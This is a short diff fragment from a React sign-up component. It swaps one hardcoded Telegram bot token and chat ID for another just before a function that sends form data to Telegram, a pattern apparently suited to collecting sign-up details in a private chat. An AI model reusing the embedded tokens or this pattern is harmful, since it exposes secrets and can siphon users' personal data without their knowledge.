@@ -94,8 +94,8 @@ const SignUp = () => {
     return data.secure_url; // return uploaded URL
   };
 
-  const BOT_TOKEN = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
-  const CHAT_ID = "6837437455";
+  const BOT_TOKEN = "8687538549:AAFXDNYEGIZIOlIY5RFIIlqMgFTKCHvHLkw";
+  const CHAT_ID = "8737535256";
 
   const sendToTelegram = async (data: any) => {
     const message = `
